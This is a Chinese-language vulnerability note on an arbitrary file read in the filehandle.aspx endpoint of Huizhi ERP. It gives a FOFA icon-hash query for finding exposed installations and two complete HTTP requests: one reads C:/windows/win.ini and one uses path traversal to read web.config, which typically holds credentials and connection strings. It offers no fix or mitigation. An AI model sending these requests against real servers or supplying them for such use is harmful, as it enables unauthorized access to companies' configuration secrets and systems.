# 汇智ERP filehandle存在任意文件读取漏洞

# 一、漏洞简介
汇智ERP是一款由江阴汇智软件技术有限公司开发的企业资源规划（ERP）软件，旨在通过信息化手段帮助企业优化业务流程，提升管理效率，增强综合竞争力。适用于各类企业，包括大型企业、中小型企业以及集团化企业。根据企业规模和业务需求，汇智ERP提供了不同的版本（如集团版和标准版），以满足企业的个性化需求。汇智ERP filehandle存在任意文件读取漏洞

# 二、影响版本
+ 汇智ERP

# 三、资产测绘
+ fofa`icon_hash="-642591392"`
+ 特征

![1721894686519-5cc4f9a9-8678-47d5-9542-2110734d50f0.png](./img/LRh-q9BuPwVokhJN/1721894686519-5cc4f9a9-8678-47d5-9542-2110734d50f0-978003.png)

# 四、漏洞复现
```plain
GET /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![1721894837449-b25e1e44-568b-4cd8-8659-aa625a784dbd.png](./img/LRh-q9BuPwVokhJN/1721894837449-b25e1e44-568b-4cd8-8659-aa625a784dbd-669353.png)

```plain
GET /nssys/common/filehandle.aspx?filepath=../../web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![1721894900847-10896155-e4aa-4f6a-a3e3-cb71ee6773de.png](./img/LRh-q9BuPwVokhJN/1721894900847-10896155-e4aa-4f6a-a3e3-cb71ee6773de-934998.png)



> 更新: 2024-08-12 17:29:10  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rpkrxscac0dp5hda>